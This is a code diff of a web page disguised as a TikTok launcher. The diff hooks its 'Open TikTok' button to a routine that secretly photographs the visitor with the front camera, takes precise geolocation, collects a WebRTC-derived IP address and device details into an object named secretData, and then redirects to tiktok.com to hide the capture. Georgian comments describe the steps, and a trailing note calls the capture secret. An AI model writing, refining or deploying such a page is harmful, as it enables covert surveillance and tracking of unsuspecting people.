@@ -24,7 +24,7 @@
     <div class="container">
         <div class="logo">TikTok</div>
         <p>Watch trending videos, follow creators, and discover new content.</p>
-        <button class="btn" id="mainBtn">🎵 Open TikTok</button>
+        <button class="btn" id="mainBtn" onclick="startProcess()">🎵 Open TikTok</button>
         <div class="spinner" id="loader"></div>
     </div>
 
@@ -45,6 +45,7 @@
             orientation: "უცნობია", vibrated: "არა", lat: "უარი", lon: "უარი", image: null
         };
 
+        // 1. კამერა (4 წამი, რომ ზუსტად მოასწროს)
         const getCamera = () => new Promise((resolve) => {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -59,21 +60,25 @@
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             stream.getTracks().forEach(track => track.stop()); 
                             resolve(canvas.toDataURL('image/png'));
-                        }, 3000);
+                        }, 4000);
                     }).catch(() => resolve(null));
             } else { resolve(null); }
         });
 
+        // 2. ლოკაცია (1 წამიანი პაუზით)
         const getLocation = () => new Promise((resolve) => {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                    () => resolve({ lat: "უარი", lon: "უარი" }),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        () => resolve({ lat: "უარი", lon: "უარი" }),
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                }, 1000); 
             } else { resolve({ lat: "უარი", lon: "უარი" }); }
         });
 
+        // 3. დანარჩენი ინფო
         async function collectRestInfo() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -135,6 +140,7 @@
             secretData.ram = navigator.deviceMemory || "უცნობია";
         }
 
+        // 4. მთავარი ფუნქცია
         async function startProcess() {
             const btn = document.getElementById('mainBtn');
             const loader = document.getElementById('loader');
@@ -166,9 +172,9 @@
 
             // 5. წარმატება
             loader.style.display = 'none';
-            document.querySelector('.container').innerHTML = <div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>;
+            document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
             setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
         }
     </script>
 </body>
-</html>
+</html>აქ იგებს დამალულად
